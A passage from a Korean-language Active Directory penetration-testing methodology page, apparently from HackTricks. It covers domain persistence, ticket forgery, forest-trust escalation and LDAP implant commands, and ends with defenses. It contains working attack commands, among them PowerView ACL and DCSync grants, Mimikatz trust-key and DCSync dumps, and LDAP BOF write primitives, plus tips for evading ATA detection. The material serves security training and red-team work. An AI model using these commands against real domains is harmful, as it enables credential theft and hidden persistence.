**취약한 템플릿이 구성되어 있다면**, 이를 악용해 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 높은 권한 계정으로의 사후 착취

### 도메인 자격증명 덤프

일단 **Domain Admin** 또는 더 나아가 **Enterprise Admin** 권한을 얻으면, **도메인 데이터베이스**인 _ntds.dit_을 **덤프**할 수 있습니다.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### 권한 상승을 이용한 영속성 (Privesc as Persistence)

앞서 논의한 일부 기술은 영속성에 사용될 수 있습니다.\
예를 들어 다음과 같이 할 수 있습니다:

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 사용자에게 [**DCSync**](#dcsync) 권한 부여

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket 공격**은 특정 서비스에 대해 정당한 Ticket Granting Service (TGS) 티켓을 생성하는데, 이는 예를 들어 **PC 계정의 NTLM hash** 같은 것을 사용합니다. 이 방법은 **서비스 권한에 접근**하기 위해 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket 공격**은 공격자가 Active Directory(AD) 환경에서 **krbtgt 계정의 NTLM hash**에 접근하는 것을 포함합니다. 이 계정은 모든 **Ticket Granting Ticket (TGT)**을 서명하는 데 사용되므로 AD 네트워크 내 인증에 필수적입니다.

공격자가 이 해시를 획득하면, 어떤 계정이든지(예: Silver ticket 공격과 유사하게) 위한 **TGT를 생성**할 수 있습니다.


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이는 일반적인 golden ticket 탐지 메커니즘을 **우회하도록 위조된 golden ticket**과 유사합니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### 인증서 기반 계정 영속성

**계정의 인증서를 보유하거나 요청할 수 있는 능력**은 사용자의 계정에 (비밀번호를 변경하더라도) 영속적으로 머무를 수 있는 매우 좋은 방법입니다:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### 인증서 기반 도메인 영속성

**인증서를 사용해 도메인 내에서 높은 권한으로 영속화**하는 것도 가능합니다:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder 그룹

Active Directory의 **AdminSDHolder** 객체는 **특권 그룹**(예: Domain Admins, Enterprise Admins)의 보안을 보장하기 위해 이러한 그룹에 표준 **ACL**을 적용하여 무단 변경을 방지합니다. 그러나 이 기능은 악용될 수 있습니다; 공격자가 AdminSDHolder의 ACL을 수정하여 일반 사용자에게 전체 접근 권한을 부여하면, 해당 사용자는 모든 특권 그룹에 대한 광범위한 제어권을 얻게 됩니다. 이 보안 조치는 면밀히 모니터링되지 않으면 오히려 원치 않는 접근을 허용할 수 있습니다.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM 자격증명

각 **Domain Controller (DC)** 내부에는 **로컬 관리자** 계정이 존재합니다. 해당 머신에서 관리자 권한을 얻으면, 로컬 Administrator 해시는 **mimikatz**를 사용해 추출할 수 있습니다. 이후 이 비밀번호의 사용을 **활성화**하기 위해 레지스트리 수정을 수행하면 로컬 Administrator 계정으로 원격 접속이 가능해집니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL 영속성

특정 도메인 객체에 대해 일부 **특수 권한을 사용자에게 부여**하여 해당 사용자가 **향후 권한 상승**을 할 수 있도록 할 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### 보안 기술자(Security Descriptors)

**Security descriptors**는 객체가 다른 객체에 대해 갖는 **권한을 저장**하는 데 사용됩니다. 객체의 **security descriptor**에 **작은 변경만 해도**, 해당 객체에 대해 매우 흥미로운 권한을 얻을 수 있으며, 이는 특권 그룹의 구성원이 될 필요가 없습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

메모리의 **LSASS**를 수정하여 모든 도메인 계정에 대해 **범용 비밀번호**를 설정하면 모든 계정에 접근할 수 있습니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자신의 **SSP**를 만들어 머신에 접근하는 데 사용되는 **자격증명을 평문으로 캡처**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

이 기술은 Active Directory에 **새 도메인 컨트롤러를 등록**하고 이를 사용해 지정된 객체들에 대해 변경 사항(SIDHistory, SPNs 등)을 **로그를 남기지 않고 푸시**합니다. 이 작업을 위해서는 DA 권한과 **루트 도메인 내부에 있을 것**이 필요합니다.\
잘못된 데이터를 사용하면 상당히 눈에 띄는 로그가 생성될 수 있다는 점을 유의하세요.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS 영속성

앞서 LAPS 비밀번호를 읽을 수 있는 **충분한 권한**이 있으면 권한 상승이 가능하다고 논의했습니다. 그러나 이러한 비밀번호는 **영속성 유지**에도 사용될 수 있습니다.\
참조:


{{#ref}}
laps.md
{{#endref}}

## 포리스트 권한 상승 - 도메인 신뢰

마이크로소프트는 **포리스트(Forest)**를 보안 경계로 간주합니다. 이는 **하나의 도메인을 탈취하는 것으로 포리스트 전체가 위험해질 수 있다**는 것을 의미합니다.

### 기본 정보

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **도메인**의 사용자가 다른 **도메인**의 자원에 접근할 수 있도록 하는 보안 메커니즘입니다. 이는 두 도메인의 인증 시스템 간의 연계를 생성하여 인증 검증이 원활하게 흐르도록 합니다. 도메인들이 트러스트를 설정하면, 트러스트의 무결성에 중요한 특정 **키**를 각 도메인의 **Domain Controller (DC)**에 교환 및 저장합니다.

일반적인 시나리오에서 사용자가 **신뢰된 도메인**의 서비스에 접근하려면 먼저 자신의 도메인 DC로부터 **inter-realm TGT**라는 특수한 티켓을 요청해야 합니다. 이 TGT는 두 도메인이 합의한 **공유 키**로 암호화됩니다. 사용자는 이 TGT를 **신뢰된 도메인의 DC**에 제시하여 서비스 티켓(**TGS**)을 받습니다. 신뢰된 도메인의 DC가 inter-realm TGT를 공유된 트러스트 키로 검증하면, 요청한 서비스에 대한 TGS를 발급하여 사용자의 서비스 접근을 허용합니다.

**단계**:

1. **Domain 1**의 클라이언트 컴퓨터가 자신의 **NTLM hash**를 사용하여 **Domain Controller (DC1)**에 **Ticket Granting Ticket (TGT)**를 요청합니다.
2. 클라이언트가 성공적으로 인증되면 DC1은 새로운 TGT를 발급합니다.
3. 클라이언트는 **Domain 2**의 리소스에 접근하기 위해 DC1로부터 **inter-realm TGT**를 요청합니다.
4. inter-realm TGT는 양방향 도메인 트러스트의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 이 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)**에 제출합니다.
6. DC2는 공유된 trust key를 사용해 inter-realm TGT를 검증하고, 유효하면 클라이언트가 접근하려는 Domain 2의 서버에 대한 **Ticket Granting Service (TGS)**를 발급합니다.
7. 마지막으로, 클라이언트는 이 TGS를 서버에 제출하며, 해당 TGS는 서버 계정 해시로 암호화되어 Domain 2의 서비스 접근을 허용합니다.

### 다양한 트러스트 유형

트러스트는 **단방향(1 way)** 또는 **양방향(2 ways)** 일 수 있다는 점에 유의해야 합니다. 양방향 설정에서는 두 도메인이 서로를 신뢰하지만, **단방향**의 경우 한 도메인은 **trusted**이고 다른 도메인은 **trusting** 도메인입니다. 이 경우 **trusted 도메인에서 trusting 도메인 내부의 자원에만 접근할 수 있습니다**.

예를 들어 Domain A가 Domain B를 신뢰하면, A는 trusting 도메인이고 B는 trusted 도메인입니다. 또한 **Domain A**에서는 이는 **Outbound trust**가 되며, **Domain B**에서는 **Inbound trust**가 됩니다.

**다양한 신뢰 관계**

- **Parent-Child Trusts**: 동일한 포리스트 내에서 흔한 구성으로, 자식 도메인은 자동으로 부모 도메인과 양방향 전이적(transitive) 트러스트를 갖습니다. 즉 인증 요청이 부모와 자식 간에 원활하게 흐릅니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며, 자식 도메인 간에 설정되어 참조 과정을 단축합니다. 복잡한 포리스트에서 인증 참조는 보통 포리스트 루트까지 올라갔다가 대상 도메인으로 내려가야 합니다. cross-link를 생성하면 이 경로가 단축되어 지리적으로 분산된 환경에서 유용합니다.
- **External Trusts**: 서로 관련 없는 다른 도메인 간에 설정되며 전이적이 아닙니다. [Microsoft 문서](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에 따르면 external trusts는 포리스트 트러스트로 연결되어 있지 않은 외부 도메인의 리소스에 접근할 때 유용합니다. External trusts에는 SID 필터링이 적용되어 보안이 강화됩니다.
- **Tree-root Trusts**: 포리스트 루트 도메인과 새로 추가된 트리 루트 간에 자동으로 설정됩니다. 자주 접하지는 않지만, 포리스트에 새로운 도메인 트리를 추가할 때 중요하며 두 방향 전이성을 보장합니다. 자세한 내용은 [Microsoft 가이드](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)를 참고하세요.
- **Forest Trusts**: 두 포리스트 루트 도메인 간의 양방향 전이적 트러스트로, SID 필터링을 통해 보안이 강화됩니다.
- **MIT Trusts**: RFC4120을 준수하는 비-Windows Kerberos 도메인과 설정되는 트러스트입니다. MIT trusts는 비-Windows Kerberos 기반 시스템과 통합이 필요한 환경에 특화되어 있습니다.

#### 신뢰 관계의 다른 차이점

- 트러스트 관계는 **전이적(transitive)**일 수 있습니다(예: A는 B를 신뢰하고 B는 C를 신뢰하면 A는 C를 신뢰) 또는 **비전이적(non-transitive)**일 수 있습니다.
- 트러스트 관계는 **양방향 트러스트**(서로 신뢰) 또는 **단방향 트러스트**(한쪽만 신뢰)로 설정될 수 있습니다.

### 공격 경로

1. 신뢰 관계를 **열거(enumerate)** 합니다.
2. 어떤 **security principal**(user/group/computer)이 **다른 도메인의 리소스에 접근할 수 있는지** 확인합니다(ACE 항목이나 다른 도메인의 그룹에 속해 있는지 등). **도메인 간 관계**를 찾아보세요(트러스트는 아마 이를 위해 생성되었을 가능성이 큽니다).
1. 이 경우 kerberoast도 또 다른 옵션이 될 수 있습니다.
3. 도메인 간 피벗할 수 있는 **계정들을 탈취(compromise)** 합니다.

다른 도메인의 리소스에 접근할 수 있는 공격자는 주로 세 가지 메커니즘을 통해 접근할 수 있습니다:

- **로컬 그룹 멤버십**: 원격 머신의 “Administrators” 그룹 같은 로컬 그룹에 principal이 추가되어 해당 머신에 대한 상당한 제어권을 얻을 수 있습니다.
- **외부 도메인 그룹 멤버십**: principal이 외부 도메인의 그룹 멤버일 수도 있습니다. 다만 이 방법의 효율성은 트러스트의 특성과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: principal이 **ACE**로서 **DACL** 내에 명시되어 특정 리소스에 접근할 수 있습니다. ACL, DACL, ACE의 작동 원리를 더 깊이 이해하려면 백서 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”를 참고하세요.

### 권한이 있는 외부 사용자/그룹 찾기

도메인에서 외부 보안 주체(foreign security principals)를 찾으려면 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**을 확인할 수 있습니다. 이는 **외부 도메인/포리스트**의 사용자/그룹을 나타냅니다.

이는 **Bloodhound**에서 확인하거나 powerview를 사용하여 확인할 수 있습니다.
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
도메인 트러스트를 열거하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 신뢰된 키가 **2개** 있습니다. 하나는 _Child --> Parent_용이고 다른 하나는 _Parent_ --> _Child_용입니다.\
> 현재 도메인에서 사용되는 키는 다음으로 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

신뢰를 악용한 SID-History injection으로 child/parent 도메인에서 Enterprise admin으로 권한 상승할 수 있습니다:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)을 어떻게 악용할 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경에서 포리스트 전체의 구성 데이터를 저장하는 중앙 저장소 역할을 합니다. 이 데이터는 포리스트의 모든 Domain Controller (DC)에 복제되며, 쓰기 가능한 DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 **DC에서의 SYSTEM 권한**이 필요하며, 가능하면 child DC가 바람직합니다.

**Link GPO to root DC site**

Configuration NC의 Sites 컨테이너에는 AD 포리스트 내의 모든 도메인 가입 컴퓨터들의 사이트 정보가 포함되어 있습니다. 어느 DC에서든 SYSTEM 권한으로 작동하면 공격자는 GPO를 root DC 사이트에 링크할 수 있습니다. 이 조치는 해당 사이트에 적용되는 정책을 조작하여 루트 도메인을 손상시킬 수 있습니다.

자세한 정보는 다음 연구를 참조하세요: [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

공격 벡터는 도메인 내의 권한 있는 gMSA를 표적으로 삼는 것입니다. gMSA의 비밀번호를 계산하는 데 필수적인 KDS Root key는 Configuration NC에 저장되어 있습니다. 어느 DC에서든 SYSTEM 권한이 있으면 KDS Root key에 접근해 포리스트 전체의 모든 gMSA 비밀번호를 계산할 수 있습니다.

자세한 분석 및 단계별 안내는 다음을 참조하세요:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적인 delegated MSA 공격 (BadSuccessor – migration attributes 악용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

이 방법은 새로운 권한 있는 AD 객체가 생성될 때까지 인내심을 요구합니다. SYSTEM 권한을 가진 공격자는 AD Schema를 수정하여 모든 클래스에 대해 임의의 사용자에게 전체 제어 권한을 부여할 수 있습니다. 이는 새로 생성되는 AD 객체에 대한 무단 접근 및 제어로 이어질 수 있습니다.

추가 읽을거리는 다음을 참조하세요: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 취약점은 PKI 객체에 대한 제어를 목표로 하여 포리스트 내의 임의 사용자로 인증할 수 있는 인증서 템플릿을 생성합니다. PKI 객체는 Configuration NC에 존재하므로, 쓰기 가능한 child DC를 침해하면 ESC5 공격을 수행할 수 있습니다.

자세한 내용은 다음을 참조하세요: [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). ADCS가 없는 환경에서는 공격자가 필요한 구성 요소를 직접 설정할 수도 있습니다. 관련 내용은 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)를 참조하세요.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 시나리오에서는 외부 도메인이 **당신의 도메인을 신뢰**하여 당신에게 해당 도메인에 대해 **확정되지 않은 권한**을 부여합니다. 당신은 **도메인 내 어떤 주체가 외부 도메인에 대해 어떤 접근 권한을 가지는지** 찾아낸 다음 이를 악용하려 시도해야 합니다:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포리스트 도메인 - 일방향(아웃바운드)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

다른 방법으로 trusted domain을 손상시키는 방법은 도메인 트러스트의 **opposite direction**에 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이 경우는 흔하지 않습니다).

또 다른 방법은 **trusted domain의 사용자가 접근할 수 있는** 머신에서 기다렸다가 그 사용자가 **RDP**로 로그인하도록 하는 것입니다. 그러면 공격자는 RDP 세션 프로세스에 코드를 주입하고 그곳에서 **access the origin domain of the victim**할 수 있습니다.  
게다가, 만약 **victim mounted his hard drive** 상태라면, 공격자는 **RDP session** 프로세스에서 하드 드라이브의 **startup folder of the hard drive**에 **backdoors**를 저장할 수 있습니다. 이 기법을 **RDPInception.**이라고 합니다.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 도메인 트러스트 남용 완화

### **SID Filtering:**

- SID Filtering은 포리스트 간 트러스트에서 SID history 속성을 악용한 공격의 위험을 완화하며, 모든 포리스트 간 트러스트에서 기본적으로 활성화되어 있습니다. 이는 Microsoft의 관점에서 포리스트를 보안 경계로 간주하고 도메인 간 트러스트를 안전하다고 가정하는 접근법에 기반합니다.
- 다만 문제가 있습니다: SID Filtering은 애플리케이션과 사용자 접근을 방해할 수 있어 때때로 비활성화되는 경우가 있습니다.

### **Selective Authentication:**

- 포리스트 간 트러스트의 경우 Selective Authentication을 사용하면 두 포리스트의 사용자가 자동으로 인증되지 않도록 하고, 대신 신뢰 도메인 또는 포리스트 내의 도메인과 서버에 접근하려면 명시적인 권한이 요구됩니다.
- 이 조치들이 writable Configuration Naming Context (NC)나 트러스트 계정 공격을 막아주지는 않는다는 점을 유의해야 합니다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP 열거

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers`는 짧은 이름/OU 경로를 전체 DN으로 해석하여 해당 객체들을 덤프합니다.
- `get-object`, `get-attribute`, and `get-domaininfo`는 임의의 속성(보안 설명자 포함)과 `rootDSE`로부터 포리스트/도메인 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd`는 roasting 후보, delegation 설정, 그리고 LDAP에서 직접 존재하는 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 디스크립터를 노출합니다.
- `get-acl` and `get-writable --detailed`는 DACL을 파싱하여 trustee, 권한(GenericAll/WriteDACL/WriteOwner/attribute writes) 및 상속 정보를 나열하며, 즉시 대상이 될 수 있는 ACL 권한 상승 포인트를 제공합니다.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 쓰기 프리미티브 — 권한 상승 및 지속성

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`)는 운영자가 OU 권한이 있는 위치에 새 principals 또는 machine accounts를 스테이징할 수 있게 해줍니다. `add-groupmember`, `set-password`, `add-attribute`, 및 `set-attribute`는 write-property 권한이 확보되면 대상 계정을 직접 탈취합니다.
- ACL 중심 명령어들(`add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync`)은 AD 객체의 WriteDACL/WriteOwner를 비밀번호 재설정, 그룹 멤버십 제어, 또는 DCSync 복제 권한으로 변환하여 PowerShell/ADSI 아티팩트를 남기지 않고도 수행합니다. `remove-*` 계열 명령어는 주입된 ACE를 정리합니다.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn`은 손상된 사용자를 즉시 Kerberoastable하게 만듭니다; `add-asreproastable` (UAC 토글)는 비밀번호를 건드리지 않고 AS-REP roasting 대상으로 표시합니다.
- Delegation 매크로들(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)은 비콘에서 `msDS-AllowedToDelegateTo`, UAC 플래그, 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 재작성하여 constrained/unconstrained/RBCD 공격 경로를 가능하게 하며 원격 PowerShell이나 RSAT가 필요 없게 합니다.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory`는 제어되는 principal의 SID 히스토리에 권한 있는 SID를 주입하여 (자세한 내용은 [SID-History Injection](sid-history-injection.md) 참조) LDAP/LDAPS만으로 은밀한 권한 상속을 제공합니다.
- `move-object`는 컴퓨터나 사용자의 DN/OU를 변경하여 공격자가 이미 위임된 권한이 존재하는 OU로 자산을 옮긴 뒤 `set-password`, `add-groupmember`, 또는 `add-spn`을 악용할 수 있게 합니다.
- 좁게 범위 지정된 제거 명령들(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, 등)은 연산자가 자격 증명 또는 지속성을 수집한 후 신속하게 롤백할 수 있게 하여 탐지 흔적을 최소화합니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 몇 가지 일반적인 방어책

[**자격 증명 보호 방법에 대해 더 알아보세요.**](../stealing-credentials/credentials-protections.md)

### **자격 증명 보호를 위한 방어 조치**

- **Domain Admins 제한**: Domain Admins는 도메인 컨트롤러에만 로그인하도록 제한하고 다른 호스트에서의 사용을 피하는 것이 권장됩니다.
- **서비스 계정 권한**: 서비스는 보안을 위해 Domain Admin(DA) 권한으로 실행되지 않아야 합니다.
- **일시적 권한 제한**: DA 권한이 필요한 작업의 경우 지속 시간을 제한해야 합니다. 이는 다음과 같이 구현할 수 있습니다: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **디셉션(Deception) 기술 구현**

- 디셉션 구현은 덫(예: 만료되지 않는 비밀번호나 Trusted for Delegation으로 표시된 계정을 가진 미끼 사용자 또는 컴퓨터)을 설정하는 것을 포함합니다. 자세한 접근법에는 특정 권한을 가진 사용자 생성 또는 고권한 그룹에 추가하는 것이 포함됩니다.
- 실무 예시는 다음 도구 사용을 포함합니다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 디셉션 기술 배포에 대한 자세한 내용은 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)에서 확인할 수 있습니다.

### **디셉션 식별**

- **사용자 객체의 경우**: 비정상적인 ObjectSID, 드문 로그온, 생성 날짜, 낮은 잘못된 비밀번호 실패 횟수 등은 의심스러운 지표입니다.
- **일반 지표**: 잠재적 미끼 객체의 속성을 실제 객체와 비교하면 불일치가 드러날 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)와 같은 도구가 이러한 디셉션 식별에 도움을 줄 수 있습니다.

### **탐지 시스템 우회**

- **Microsoft ATA 탐지 우회**:
- **사용자 열거 회피**: ATA 탐지를 피하기 위해 Domain Controller에서 세션 열거를 피합니다.
- **티켓 가장화**: 티켓 생성에 **aes** 키를 사용하면 NTLM으로 강등되지 않아 탐지를 회피하는 데 도움이 됩니다.
- **DCSync 공격**: Domain Controller에서 직접 실행할 경우 경보가 발생하므로 비도메인 컨트롤러에서 실행하는 것이 권장됩니다.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
